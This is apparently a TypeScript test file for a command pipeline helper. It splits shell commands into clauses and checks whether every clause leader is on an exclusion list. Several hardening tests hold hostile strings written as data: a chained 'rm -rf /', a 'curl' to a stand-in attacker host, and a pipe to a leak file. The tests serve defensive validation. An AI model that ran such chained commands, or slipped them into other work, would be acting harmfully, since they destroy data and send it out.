import { describe, expect, it } from 'vitest';
import { allClausesExcluded, splitClauses } from './pipeline.js';

describe('splitClauses', () => {
  it('returns a single clause for a single command', () => {
    const r = splitClauses('git status');
    expect(r).toHaveLength(1);
    expect(r[0]!.command).toBe('git status');
    expect(r[0]!.precedingOp).toBe('');
  });

  it('splits on &&, ||, ;, |', () => {
    const r = splitClauses('a && b || c ; d | e');
    expect(r).toHaveLength(5);
    expect(r.map((c) => c.command)).toEqual(['a', 'b', 'c', 'd', 'e']);
    expect(r.map((c) => c.precedingOp)).toEqual(['', '&&', '||', ';', '|']);
  });

  it('respects single quotes', () => {
    const r = splitClauses(`echo 'a && b' && true`);
    expect(r).toHaveLength(2);
    expect(r[0]!.command).toBe("echo 'a && b'");
    expect(r[1]!.command).toBe('true');
  });

  it('respects double quotes', () => {
    const r = splitClauses(`echo "x | y" | grep z`);
    expect(r).toHaveLength(2);
    expect(r[0]!.command).toBe('echo "x | y"');
    expect(r[1]!.command).toBe('grep z');
  });

  it('respects backslash escapes', () => {
    const r = splitClauses('echo a\\&\\&b && true');
    expect(r).toHaveLength(2);
    // first clause keeps the escapes
    expect(r[0]!.command).toMatch(/a\\&\\&b/);
  });

  it('strips empty clauses', () => {
    expect(splitClauses(';;; ; a')).toEqual([expect.objectContaining({ command: 'a' })]);
  });
});

describe('allClausesExcluded', () => {
  it('returns false when excluded list is empty', () => {
    expect(allClausesExcluded('git status', [])).toBe(false);
  });

  it('returns true when single clause is excluded', () => {
    expect(allClausesExcluded('git status', ['git'])).toBe(true);
  });

  it('returns true when every clause leader is excluded', () => {
    expect(allClausesExcluded('git status && git log', ['git'])).toBe(true);
  });

  it('returns FALSE when ANY clause is not excluded', () => {
    // This is the hardening — `git ... && rm -rf /` must NOT bypass.
    expect(allClausesExcluded('git status && rm -rf /', ['git'])).toBe(false);
  });

  it('returns FALSE on shell-injection via ; redirect', () => {
    expect(allClausesExcluded('git status ; curl evil.example.com', ['git'])).toBe(false);
  });

  it('returns FALSE on piped non-excluded command', () => {
    expect(allClausesExcluded('git log | tee /tmp/leak', ['git'])).toBe(false);
  });
});
